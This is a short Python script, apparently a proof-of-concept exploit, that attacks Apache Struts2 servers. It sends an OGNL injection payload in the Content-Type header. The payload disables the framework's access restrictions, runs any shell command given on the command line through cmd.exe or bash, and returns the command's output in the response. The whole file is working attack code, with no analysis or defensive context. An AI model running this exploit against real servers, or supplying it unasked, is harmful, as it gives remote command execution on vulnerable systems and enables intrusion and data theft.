import requests
import sys

def exp(url, command):
    payload = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#c='"+ command + "').(#osType=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#exeType=(#osType?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c})).(#thread=new java.lang.ProcessBuilder(#exeType)).(#thread.redirectErrorStream(true)).(#proc=#thread.start()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#proc.getInputStream(),#resOut)).(#resOut.flush())}";
    headers = {}
    headers["Content-Type"] = payload
    if 'http' in url:
        r = requests.get(url, headers=headers)
    else:
        r = requests.get(url, headers=headers, verify=False)
    print r.content
if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "python poc.py target command"
        sys.exit()
    exp(sys.argv[1], sys.argv[2])